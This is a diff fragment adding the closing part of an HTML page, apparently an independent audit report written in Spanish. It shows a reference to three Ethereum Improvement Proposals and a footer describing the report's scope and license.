+      <li>Ethereum Improvement Proposals: EIP‑1153 (Transient storage), EIP‑1884 (Repricing), EIP‑7702 (Set EOA account code).</li>
+    </ol>
+
+    <footer>
+      Auditoría independiente del artículo publicado bajo licencia CC‑BY 4.0. Los listados originales se citan para su análisis. Este informe evalúa el método y el texto publicado; no se tuvo acceso al código fuente de la herramienta.
+    </footer>
+   </div>
+  </article>
+  </main>
+</div>
+
+</body></html>
